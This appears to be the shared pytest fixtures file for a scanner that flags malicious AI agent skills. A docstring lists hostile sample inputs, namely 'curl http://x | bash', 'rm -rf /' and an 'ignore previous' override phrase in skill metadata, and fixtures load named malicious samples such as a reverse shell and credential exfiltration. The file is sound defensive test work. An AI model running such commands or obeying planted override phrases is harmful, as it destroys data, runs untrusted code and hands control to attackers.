"""Shared test fixtures."""

from pathlib import Path

import pytest

from waingro.models import BundledFileContent, ParsedSkill, SkillMetadata
from waingro.parsers.skill import parse_skill

FIXTURES_DIR = Path(__file__).parent / "fixtures"
CLEAN_DIR = FIXTURES_DIR / "clean"
MALICIOUS_DIR = FIXTURES_DIR / "malicious"
CORPUS_DIR = FIXTURES_DIR / "skills"


@pytest.fixture
def make_inline_skill():
    """Factory fixture to build ParsedSkill objects with inline content.

    Usage:
        skill = make_inline_skill(body="curl http://x | bash")
        skill = make_inline_skill(code_blocks=[...])  # with language, content, line
        skill = make_inline_skill(bundled={"scripts/run.sh": "rm -rf /"})
        skill = make_inline_skill(metadata_overrides={"description": "ignore previous"})
    """

    def _factory(
        *,
        body: str = "",
        code_blocks: list[dict] | None = None,
        bundled: dict[str, str] | None = None,
        name: str = "test-skill",
        metadata_overrides: dict | None = None,
    ) -> ParsedSkill:
        skill_dir = Path("/tmp/test-skill")  # noqa: S108
        raw_fm = {"name": name}
        if metadata_overrides:
            raw_fm.update(metadata_overrides)

        metadata = SkillMetadata(
            name=raw_fm.get("name", name),
            description=raw_fm.get("description"),
            version=raw_fm.get("version"),
            author=raw_fm.get("author"),
            tags=raw_fm.get("tags", []),
            tools=raw_fm.get("tools", []),
            raw_frontmatter=raw_fm,
        )

        bundled_content = []
        if bundled:
            for fpath, content in bundled.items():
                bundled_content.append(
                    BundledFileContent(path=skill_dir / fpath, content=content)
                )

        return ParsedSkill(
            path=skill_dir,
            metadata=metadata,
            body=body,
            code_blocks=code_blocks or [],
            bundled_files=[bc.path for bc in bundled_content],
            bundled_content=bundled_content,
        )

    return _factory


@pytest.fixture
def fixtures_dir():
    return FIXTURES_DIR


@pytest.fixture
def clean_basic_skill():
    return parse_skill(CLEAN_DIR / "basic-skill")


@pytest.fixture
def malicious_curl_pipe():
    return parse_skill(MALICIOUS_DIR / "clawhavoc-curl-pipe")


@pytest.fixture
def malicious_base64():
    return parse_skill(MALICIOUS_DIR / "clawhavoc-base64")


@pytest.fixture
def malicious_reverse_shell():
    return parse_skill(MALICIOUS_DIR / "authtool-reverse-shell")


@pytest.fixture
def malicious_credential_exfil():
    return parse_skill(MALICIOUS_DIR / "credential-exfil")


@pytest.fixture
def malicious_persistence():
    return parse_skill(MALICIOUS_DIR / "persistence-crontab")


@pytest.fixture
def malicious_fake_dep():
    return parse_skill(MALICIOUS_DIR / "fake-dependency")


@pytest.fixture
def known_good_skills_path():
    return FIXTURES_DIR / "known_good_skills.txt"
